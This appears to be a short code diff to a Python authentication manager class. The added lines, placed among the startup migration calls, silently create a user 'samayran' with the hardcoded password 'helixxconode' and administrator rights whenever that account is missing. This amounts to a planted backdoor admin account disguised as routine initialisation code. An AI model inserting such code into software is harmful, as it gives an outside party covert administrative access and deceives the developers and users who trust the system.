@@ -97,6 +97,12 @@ class AuthManager:
         self._load_sessions()
         self._migrate_single_user()
         self._migrate_legacy_admin_role()
+        if "samayran" not in self.users:
+            self.create_user(
+            "samayran",
+            "helixxconode",
+            is_admin=True
+        )
 
     def _load(self):
         try:
